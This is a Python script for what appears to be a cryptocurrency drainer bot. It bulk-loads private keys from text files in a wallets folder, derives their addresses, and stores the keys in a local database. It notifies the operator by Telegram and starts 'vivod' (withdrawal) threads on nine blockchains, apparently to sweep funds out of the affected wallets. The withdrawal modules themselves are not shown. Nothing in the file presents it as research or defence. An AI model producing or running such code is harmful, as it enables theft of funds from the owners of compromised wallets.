import glob
import database as db
import eth as vivod_eth
import bnb as vivod_bnb
import polygon as vivod_matic
import op as vivod_op
import arb as vivod_arb
import avax as vivod_avax
import base as vivod_base
import zksync as vivod_zksync
import manta as vivod_manta

from config import YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN
import telegram
from telegram import Bot
from web3 import Web3
import threading

bot = Bot(token=TELEGRAM_BOT_TOKEN)

def parse_private_keys():
    """parse private keys"""
    all_files = glob.glob('wallets\\*.txt')
    print(f'Total found: {len(all_files)}.txt file')
    added_count = 0
    for file_path in all_files:
        lines = open(file_path, encoding='UTF-8').readlines()
        for line in lines:
            private_key = line.strip()
            info = get_info_about_private_key(private_key)
            if info:
                result = db.check(info)
                if result:
                    added_count += 1
    print(f'Total added: {added_count} private keys')

    start = f'https://ibb.co/pbr8ZVh'
    bot.send_message(chat_id=YOUR_CHAT_ID, text=start)

def start_work():
    """acts"""
    search_db = glob.glob('*')
    if 'seeds.db' in search_db:
        print('The database has been found and Im starting checking for new private keys')
        parse_private_keys()
        threading.Thread(target=vivod_bnb.start_vivod, args=()).start()
        threading.Thread(target=vivod_eth.start_vivod, args=()).start()
        threading.Thread(target=vivod_matic.start_vivod, args=()).start()
        threading.Thread(target=vivod_op.start_vivod, args=()).start()
        threading.Thread(target=vivod_arb.start_vivod, args=()).start()
        threading.Thread(target=vivod_avax.start_vivod, args=()).start()
        threading.Thread(target=vivod_base.start_vivod, args=()).start()
        threading.Thread(target=vivod_zksync.start_vivod, args=()).start()
        threading.Thread(target=vivod_manta.start_vivod, args=()).start()

    else:
        print('Database not found I am creating')
        db.create_db()
        parse_private_keys()
        threading.Thread(target=vivod_bnb.start_vivod, args=()).start()
        threading.Thread(target=vivod_eth.start_vivod, args=()).start()
        threading.Thread(target=vivod_matic.start_vivod, args=()).start()
        threading.Thread(target=vivod_op.start_vivod, args=()).start()
        threading.Thread(target=vivod_arb.start_vivod, args=()).start()
        threading.Thread(target=vivod_avax.start_vivod, args=()).start()
        threading.Thread(target=vivod_base.start_vivod, args=()).start()
        threading.Thread(target=vivod_zksync.start_vivod, args=()).start()
        threading.Thread(target=vivod_manta.start_vivod, args=()).start()

def get_info_about_private_key(private_key):
    """get address from private key using web3"""
    try:
        w3 = Web3()
        account = w3.eth.account.privateKeyToAccount(private_key)
        address = account.address
        return [address, private_key]
    except Exception as e:
        print(e)
        return None

if __name__ == '__main__':
    start_work()
